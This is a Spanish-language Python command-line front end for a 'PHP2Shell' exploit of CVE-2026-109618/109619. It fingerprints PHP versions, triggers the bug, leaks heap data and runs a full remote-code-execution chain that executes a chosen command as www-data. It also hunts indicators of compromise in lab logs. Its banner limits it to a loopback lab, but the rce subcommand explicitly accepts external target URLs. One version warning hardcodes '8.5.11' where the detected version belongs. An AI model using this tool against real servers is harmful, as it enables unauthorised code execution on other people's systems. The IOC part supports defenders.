#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════════════════════
  PHP2SHELL · CVE-2026-109618 / CVE-2026-109619 — herramienta unificada
═══════════════════════════════════════════════════════════════════════════════
  Un solo script para todo el ciclo de explotación:

    version   → fingerprint de la versión PHP del objetivo (sin trigger)
    check     → verificación de vulnerabilidad (trigger + veredicto)
    info      → reconocimiento del target RCE (identidad, build, worker)
    leak      → oracle de leak del heap (SIN fire — nunca dispara)
    rce       → cadena RCE completa (leak + fire, contenedor fresco por intento)
    iocs      → caza de IOCs en los logs del lab (para tu SIEM)

  Código de salida:
    version → 0 si responde · 3 error
    check   → 0 VULNERABLE · 1 NOT_VULNERABLE · 2 INDETERMINADO · 3 ERROR
    rce     → 0 RCE logrado · 1 sin RCE en los intentos
    iocs    → 0 limpio · 1 hallazgos · 2 error de acceso

  ⚠️  USO EXCLUSIVO EN ENTORNO AISLADO DE LABORATORIO (solo loopback).
      La vulnerabilidad se está explotando activamente en la wild; apuntar
      estas herramientas a sistemas de terceros es ilegal.
═══════════════════════════════════════════════════════════════════════════════
"""
from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

# ---------------------------------------------------------------------------
# Constantes del lab
# ---------------------------------------------------------------------------
ROOT = Path(__file__).resolve().parent
SCRIPTS = ROOT / "scripts"
sys.path.insert(0, str(SCRIPTS))

RCE_CTR = "php2shell-rce-target"
RCE_PORT = 18081
RCE_URL = f"http://127.0.0.1:{RCE_PORT}/t.php"
RCE_IMAGE = "php@sha256:974e3a920309308e1690ed607e6cc3061d6906f90cc8d30fe519daa48bccf101"
DEFAULT_ATTEMPTS = 8

# ANSI
G, R, Y, B, D, X = "\033[92m", "\033[91m", "\033[93m", "\033[1m", "\033[2m", "\033[0m"
W = "\033[97m"

BANNER = f"""{B}
╔══════════════════════════════════════════════════════════════════╗
║  {W}PHP2SHELL{B}  ·  CVE-2026-109618 / CVE-2026-109619  ·  CVSS 9.2{B}     ║
║  {D}laboratorio Docker · uso exclusivo aislado (solo loopback){B}        ║
╚══════════════════════════════════════════════════════════════════╝{X}"""


def ok(msg: str) -> None:
    print(f"{G}  ✔{X} {msg}")


def warn(msg: str) -> None:
    print(f"{Y}  ⚠{X} {msg}")


def err(msg: str) -> None:
    print(f"{R}  ✘{X} {msg}")


def phase(n: str, title: str) -> None:
    print(f"\n{B}── FASE {n} · {title} " + "─" * max(0, 52 - len(title)) + X)


def die(msg: str, code: int = 3) -> "None":
    err(msg)
    sys.exit(code)


# ---------------------------------------------------------------------------
# Import de los tres motores (reutilización total, cero duplicación)
# ---------------------------------------------------------------------------
def repro_engine() -> "module":
    import php2shell_repro
    return php2shell_repro


def iocs_engine() -> "module":
    import php2shell_iocs
    return php2shell_iocs


def rce_engine() -> "module":
    import php2shell_rce
    return php2shell_rce


# ---------------------------------------------------------------------------
# SUBCOMANDO: version — fingerprint sin trigger
# ---------------------------------------------------------------------------
def cmd_version(args: argparse.Namespace) -> int:
    """Fingerprint pasivo de versión: HTTP al endpoint de identidad
    (opcionalmente corroborado con docker exec). No envía ningún trigger."""
    phase("0", "FINGERPRINT pasivo de versión")
    url = args.target.rstrip("/") + args.path
    try:
        with urllib.request.urlopen(url, timeout=args.timeout) as resp:
            body = resp.read().decode("utf-8", "replace").strip()
    except Exception as exc:  # noqa: BLE001 — reportamos y salimos con código 3
        err(f"sin respuesta de {url} ({exc})")
        return 3
    m = re.search(r"php=([0-9.]+)", body)
    ml = re.search(r"memory_limit=(\S+)", body)
    if not m:
        err(f"respuesta no reconocida: {body[:80]!r}")
        return 3
    version = m.group(1)
    ok(f"PHP      : {B}{version}{X}")
    if ml:
        ok(f"memoria  : {ml.group(1)}")
    try:
        pid = re.search(r"worker=(\d+)", body)
        if pid:
            ok(f"worker   : pid {pid.group(1)}")
    except Exception:
        pass

    vulnerable = args.vuln_below and tuple(int(p) for p in version.split(".")[:3]) < tuple(
        int(p) for p in args.vuln_below.split(".")[:3]
    )
    print()
    if args.vuln_below:
        if vulnerable:
            warn(f"8.5.11 < {args.vuln_below} → versión EN RANGO de los CVEs (verifica con 'check')")
        else:
            ok(f"≥ {args.vuln_below} → fuera del rango conocido de los CVEs")
    return 0


# ---------------------------------------------------------------------------
# SUBCOMANDO: check — trigger + veredicto (motor: php2shell_repro)
# ---------------------------------------------------------------------------
def cmd_check(args: argparse.Namespace) -> int:
    phase("1", "VERIFICACIÓN de vulnerabilidad (trigger + veredicto)")
    engine = repro_engine()
    argv = [args.target, "--attempts", str(args.attempts)]
    if args.container:
        argv += ["--container", args.container]
    for flag in ("--json", "--explain", "--no-color", "--verbose"):
        if getattr(args, flag[2:].replace("-", "_")):
            argv.append(flag)
    code = engine.main(argv)
    print()
    if code == 0:
        ok(f"{B}VULNERABLE{X} — condición CVE-2026-109618 reproducida (exit 0)")
    elif code == 1:
        ok(f"{B}NOT_VULNERABLE{X} — build parcheada / gestión segura del OOM (exit 1)")
    elif code == 2:
        warn("INDETERMINADO — señales insuficientes; prueba --container o ajusta tamaños")
    else:
        err(f"ERROR de ejecución (exit {code})")
    return code


# ---------------------------------------------------------------------------
# SUBCOMANDO: info — reconocimiento del target RCE
# ---------------------------------------------------------------------------
def cmd_info(args: argparse.Namespace) -> int:
    phase("2", f"RECONOCIMIENTO de {args.url} (preflight sin red — el heap queda intacto)")
    sys.argv = ["php2shell.py", "--info", "-u", args.url]
    return rce_engine().main()


# ---------------------------------------------------------------------------
# SUBCOMANDO: leak — oracle sin fire
# ---------------------------------------------------------------------------
def cmd_leak(args: argparse.Namespace) -> int:
    phase("2", f"ORACLE de leak contra {args.url} (solo lectura; el par de fire NUNCA se envía)")
    sys.argv = ["php2shell.py", "--check", "-u", args.url]
    return rce_engine().main()


# ---------------------------------------------------------------------------
# Ciclo de vida del target RCE (contenedor fresco por intento — geometría)
# ---------------------------------------------------------------------------
def docker(args: list[str], check: bool = True) -> subprocess.CompletedProcess:
    return subprocess.run(["docker", *args], check=check, capture_output=True, text=True)


def rce_target_fresh() -> None:
    """Recrea el target RCE: contenedor FRESCO = nueva generación ASLR.
    Cualquier request previo desplaza la geometría del heap (EXPLOTACION.md §4.2)."""
    www = ROOT / "lab/rce/www"
    try:
        www.chmod(0o777)
    except OSError:
        pass
    (www / "o").unlink(missing_ok=True)
    docker(["rm", "-f", RCE_CTR], check=False)
    docker(["run", "-d", "--name", RCE_CTR,
            "-p", f"127.0.0.1:{RCE_PORT}:80",
            "--memory", "256m", "--memory-swap", "256m",
            "--volume", f"{ROOT}/lab/rce/mpm_prefork.conf:/etc/apache2/mods-available/mpm_prefork.conf:ro",
            "--volume", f"{www}:/var/www/html",
            RCE_IMAGE])
    time.sleep(3)


# ---------------------------------------------------------------------------
# SUBCOMANDO: rce — la cadena completa
# ---------------------------------------------------------------------------
def cmd_rce(args: argparse.Namespace) -> int:
    phase("3", f"CADENA RCE COMPLETA contra {args.url}")
    if not shutil.which("docker"):
        die("docker no está disponible")
    cmd = args.cmd
    if len(cmd.encode()) > 14:
        warn(f"comando de {len(cmd.encode())} bytes (>14): puede exceder la ventana del payload")
    engine = rce_engine()

    # El lab propio (:18081) se gestiona aquí (contenedor fresco por intento =
    # nueva generación ASLR). Un target EXTERNO no se toca: los reintentos
    # re-ejecutan la cadena, pero la generación ASLR solo cambia si su worker
    # se reinicia en el lado del servidor.
    lab_managed = args.url.rstrip("/") == RCE_URL.rstrip("/")
    if not lab_managed:
        warn(f"target EXTERNO ({args.url}): no se gestiona ningún contenedor; "
             "los reintentos re-ejecutan la cadena contra el mismo worker")
        warn("para una nueva generación ASLR el worker víctima debe reiniciarse en su servidor")

    for attempt in range(1, args.attempts + 1):
        print(f"\n{B}  ── intento {attempt}/{args.attempts}"
              + (" · contenedor fresco (nueva generación ASLR) ──" if lab_managed else " ──") + X)
        if lab_managed:
            try:
                rce_target_fresh()
            except subprocess.CalledProcessError as exc:
                err(f"no se pudo levantar el target: {exc.stderr.strip()[:120]}")
                return 3
        argv = ["-c", cmd, "-u", args.url]
        if args.explain:
            argv.append("--explain")
        if args.quiet:
            argv.append("--quiet")
        sys.argv = ["php2shell.py", *argv]
        if engine.main() == 0:
            print()
            ok(f"{B}RCE CONFIRMADO{X} en {args.url} — comando ejecutado como www-data (intento {attempt}/{args.attempts})")
            return 0
        if attempt < args.attempts:
            warn("generación ASLR no apta — " + ("recreando contenedor…" if lab_managed else "reintentando…"))
    print()
    err(f"sin RCE en {args.attempts} intentos (lotería ASLR — el autor documenta 2/3–3/3 por generación)")
    err("vuelve a lanzar: cada tirada crea contenedores frescos. Ver EXPLOTACION.md §4.2")
    return 1


# ---------------------------------------------------------------------------
# SUBCOMANDO: iocs — caza de IOCs
# ---------------------------------------------------------------------------
def cmd_iocs(args: argparse.Namespace) -> int:
    phase("4", "CAZA de IOCs en los logs del lab")
    argv = []
    if args.container:
        argv += ["--container", args.container]
    if args.json:
        argv.append("--json")
    if args.no_color:
        argv.append("--no-color")
    code = iocs_engine().main(argv)
    print()
    if code == 0:
        ok("logs limpios — sin IOCs de PHP2Shell")
    elif code == 1:
        warn(f"{B}hallazgos presentes{X} — esto es lo que meterías en tu SIEM (exit 1)")
    else:
        err("error accediendo a los logs de docker")
    return code


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def build_parser() -> argparse.ArgumentParser:
    ap = argparse.ArgumentParser(
        prog="php2shell.py",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="Herramienta unificada PHP2Shell (CVE-2026-109618/109619) — ver banner",
        epilog=f"{B}ejemplos:{X}\n"
               "  python3 php2shell.py version http://localhost:8081/\n"
               "  python3 php2shell.py check http://localhost:8081/ --container php2shell-vulnerable\n"
               "  python3 php2shell.py rce \"id\"\n"
               "  python3 php2shell.py iocs\n",
    )
    sub = ap.add_subparsers(dest="subcommand", required=True)

    p = sub.add_parser("version", help="fingerprint de versión del objetivo (sin trigger)")
    p.add_argument("target", help="URL base (p. ej. http://localhost:8081/)")
    p.add_argument("--path", default="/whoami.php", help="endpoint de identidad (default /whoami.php)")
    p.add_argument("--timeout", type=float, default=5.0)
    p.add_argument("--vuln-below", default="8.5.12", help="umbral de versión en rango (default 8.5.12)")
    p.set_defaults(fn=cmd_version)

    p = sub.add_parser("check", help="trigger + veredicto (VULNERABLE / NOT_VULNERABLE)")
    p.add_argument("target", help="URL base del objetivo")
    p.add_argument("--attempts", type=int, default=3)
    p.add_argument("--container", help="nombre del contenedor (corrobora segfault por docker logs)")
    p.add_argument("--json", action="store_true")
    p.add_argument("--explain", action="store_true", help="paneles didácticos fase a fase")
    p.add_argument("--no-color", action="store_true")
    p.add_argument("--verbose", action="store_true")
    p.set_defaults(fn=cmd_check)

    p = sub.add_parser("info", help="reconocimiento del target RCE (versión, build, worker)")
    p.add_argument("-u", "--url", default=RCE_URL, help=f"target (default: {RCE_URL})")
    p.set_defaults(fn=cmd_info)

    p = sub.add_parser("leak", help="oracle de leak del heap SIN fire")
    p.add_argument("-u", "--url", default=RCE_URL, help=f"target (default: {RCE_URL})")
    p.set_defaults(fn=cmd_leak)

    p = sub.add_parser("rce", help="cadena RCE completa (probabilística por ASLR; reintentos)")
    p.add_argument("cmd", help='comando a ejecutar (p. ej. "id", <=14 bytes ASCII)')
    p.add_argument("-u", "--url", default=RCE_URL, help=f"URL de la víctima (default: {RCE_URL} — lab gestionado; otra URL = target externo)")
    p.add_argument("--attempts", type=int, default=DEFAULT_ATTEMPTS, help=f"default {DEFAULT_ATTEMPTS}")
    p.add_argument("--explain", action="store_true", help="narración didáctica de cada fase")
    p.add_argument("--quiet", action="store_true", help="menos output (para grabar)")
    p.set_defaults(fn=cmd_rce)

    p = sub.add_parser("iocs", help="caza de IOCs en los logs")
    p.add_argument("--container", help="contenedor concreto (default: los dos del lab)")
    p.add_argument("--json", action="store_true")
    p.add_argument("--no-color", action="store_true")
    p.set_defaults(fn=cmd_iocs)

    return ap


def main() -> int:
    print(BANNER)
    args = build_parser().parse_args()
    try:
        return int(args.fn(args))
    except KeyboardInterrupt:
        print()
        err("interrumpido por el usuario")
        return 3


if __name__ == "__main__":
    sys.exit(main())
